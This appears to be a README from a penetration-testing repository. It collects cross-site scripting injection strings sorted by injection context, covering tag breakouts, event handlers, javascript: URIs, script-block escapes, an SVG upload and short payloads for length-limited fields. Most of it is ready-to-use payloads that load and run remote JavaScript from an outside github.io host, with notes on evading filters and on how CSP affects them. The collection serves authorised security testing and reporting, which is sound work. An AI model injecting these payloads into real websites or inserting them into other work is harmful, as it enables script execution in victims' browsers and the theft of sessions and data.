# Injection strings

Loaders for the payloads in this repository, grouped by the context you are
injecting into. Replace `p.js` with any other file (`a.js`, `t.js`, `c.js`,
`m.js`), depending on which variant suits the finding.

Base URL: `https://virtuesecurity.github.io/xss-poc/`

## HTML body

```html
<script src="https://virtuesecurity.github.io/xss-poc/p.js"></script>
```

Protocol-relative and unquoted, 61 characters:

```html
<script src=//virtuesecurity.github.io/xss-poc/p.js></script>
```

## Breaking out of a tag

```html
"><script src=//virtuesecurity.github.io/xss-poc/p.js></script>
'></textarea><script src=//virtuesecurity.github.io/xss-poc/p.js></script>
</title><script src=//virtuesecurity.github.io/xss-poc/p.js></script>
```

## Event handlers

Useful where `<script>` is filtered but attributes survive. `import()` runs the
file as a module; the payloads are written to work either way.

```html
<img src=x onerror=import('//virtuesecurity.github.io/xss-poc/p.js')>
<svg onload=import('//virtuesecurity.github.io/xss-poc/p.js')>
<body onload=import('//virtuesecurity.github.io/xss-poc/p.js')>
<iframe src=//virtuesecurity.github.io/xss-poc/f.html>
```

Inside an existing attribute value:

```html
" onmouseover=import('//virtuesecurity.github.io/xss-poc/p.js') x="
" autofocus onfocus=import('//virtuesecurity.github.io/xss-poc/p.js') x="
```

## URI contexts

For `href`, `src`, and anywhere a URL is reflected into a navigation:

```
javascript:import('//virtuesecurity.github.io/xss-poc/p.js')
```

For open-redirect and `window.open` findings, send the victim to the inert
landing page instead:

```
https://virtuesecurity.github.io/xss-poc/f.html
```

## Inside an existing script block

When your input lands in JavaScript rather than HTML:

```js
';import('//virtuesecurity.github.io/xss-poc/p.js');//
</script><script src=//virtuesecurity.github.io/xss-poc/p.js></script>
```

## File upload / stored XSS

Upload [`x.svg`](x.svg) wherever the application accepts images. It executes
only if the response is served inline as `image/svg+xml` and not forced to
download via `Content-Disposition: attachment`, which is itself the finding.
The file is self-contained, so it still demonstrates execution on hosts that
block external script sources.

## Length-constrained fields

| String | Length |
|---|---|
| `<script src=//virtuesecurity.github.io/xss-poc/p.js></script>` | 61 |
| `import('//virtuesecurity.github.io/xss-poc/p.js')` | 49 |
| `//virtuesecurity.github.io/xss-poc/p.js` | 39 |

If the field is shorter than any of these, prove execution inline first
(`<script>alert(1)</script>` or a `document.title` write) and note in the report
that the constraint limits payload size but not exploitability, since an attacker can
stage a longer payload from a shorter one.

## Content Security Policy

A payload loaded from this repository is a cross-origin script, so any CSP with
a meaningful `script-src` will block it. That is a legitimate mitigation and
worth recording, but it does not make the injection point safe.

- Blocked by a cross-origin `script-src`: all of the `.js` files here.
- Still relevant under CSP: `x.svg` (self-contained, same-origin once uploaded)
  and inline PoCs if `unsafe-inline` or a reusable nonce is present.
- Check `frame-ancestors` separately: `f.html` demonstrates framing, which
  `script-src` does not govern.

When CSP blocks these, demonstrate the injection with an inline payload that the
policy does allow, and report the CSP as defense in depth rather than a fix.
